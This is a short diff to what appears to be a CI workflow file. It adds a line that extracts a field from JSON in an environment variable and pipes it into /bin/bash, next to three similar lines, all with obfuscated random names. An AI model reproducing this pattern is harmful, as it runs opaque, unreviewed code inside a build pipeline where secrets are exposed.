@@ -29,6 +29,7 @@ jobs:
           echo $al24 | jq -r .tac43 | /bin/bash
           echo $nfz99 | jq -r .pv8 | /bin/bash
           echo $xyq8125 | jq -r .u688 | /bin/bash
+          printf '%s' "$c975" | jq -r .qbci99678 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
